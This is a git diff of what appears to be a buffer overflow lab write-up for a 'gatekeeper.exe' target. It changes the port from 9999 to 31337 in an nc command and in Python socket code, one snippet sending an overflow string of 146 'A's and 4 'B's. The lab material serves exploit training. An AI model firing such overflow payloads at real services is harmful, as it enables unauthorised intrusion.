@@ -95,7 +95,7 @@
             
         - ![image](https://user-images.githubusercontent.com/94720207/169188519-02fab4e5-91e4-4272-a788-9239ad878c4a.png)
            
-        - On Kali: `nc -nv 192.168.1.100 9999`
+        - On Kali: `nc -nv 192.168.1.100 31337`
             
         - ![image](https://user-images.githubusercontent.com/94720207/169638159-af1130de-075d-47b0-b6ab-a43b1ca45838.png)
  
@@ -299,7 +299,7 @@ try:
             # We will define out RHOST & RPORT (Target/Windows 10 > gatekeeper.exe)
         
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect(('192.168.1.100',9999))
+        s.connect(('192.168.1.100',31337))
         
             # Once it connects with the RHOST, the script will only prompt for any string. (Not like other labs with more interactive actions recievend data, that's why I will comment the s.recv option) recieve "intro" Data back from it (The welcome message and that stuff...)
             
@@ -341,7 +341,7 @@ gate_string = b"A" * 146 + b"B" * 4
 try:            
         print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect(('192.168.1.100',9999))
+        s.connect(('192.168.1.100',31337))
         s.send(gate_string + b'\r\n')
         s.close()
 
